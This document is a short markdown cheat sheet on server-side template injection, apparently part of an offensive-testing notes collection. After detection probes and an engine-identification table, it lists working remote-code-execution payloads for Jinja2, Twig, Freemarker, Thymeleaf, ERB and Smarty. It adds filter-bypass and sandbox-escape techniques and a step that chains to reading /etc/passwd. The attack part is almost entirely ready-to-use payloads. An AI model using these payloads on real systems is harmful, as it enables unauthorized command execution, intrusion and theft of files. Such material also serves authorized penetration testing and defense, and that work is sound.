# Server-Side Template Injection

User input rendered *by* the template engine, not just *into* it.

---

## Detection

```
{{7*7}}      ${7*7}      #{7*7}      <%= 7*7 %>      {7*7}      @(7*7)
```

A `49` in the response is SSTI. `{{7*'7'}}` distinguishes engines: Jinja → `7777777`,
Twig → `49`.

---

## Engine identification

| Result of `{{7*'7'}}` | Engine |
|---|---|
| `7777777` | Jinja2 (Python) |
| `49` | Twig (PHP) |
| error | something else |

Other probes: `${7*7}` (Freemarker/JSP EL), `#{7*7}` (Ruby/Thymeleaf), `<%= 7*7 %>` (ERB).

---

## Jinja2

```
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Filter bypass: `{{'a'.__class__}}` when `_` is filtered use `{{(a|attr('__class__'))}}`,
`{{request|attr('application')}}`.

---

## Twig

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id',null]|sort('system')}}
```

---

## Freemarker

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Thymeleaf

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

## ERB

```
<%= system('id') %>
```

## Smarty

```
{php}echo `id`;{/php}
{system('id')}
```

---

## Where it lives

Email templates, invoice/PDF generators, "custom" notification bodies, CMS themes,
marketing landing builders, report templates, filename patterns.

---

## Go deeper

1. Test in the email subject first — it is rendered server-side and often unsanitized.
2. Test the sandbox escape: `{{''.__class__.__mro__[1].__subclasses__()}}` and search for
   `subprocess.Popen`.
3. Test blind: `{{7*7}}` may render only in the PDF you download.
4. Chain to file read (`open('/etc/passwd').read()`) before RCE.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
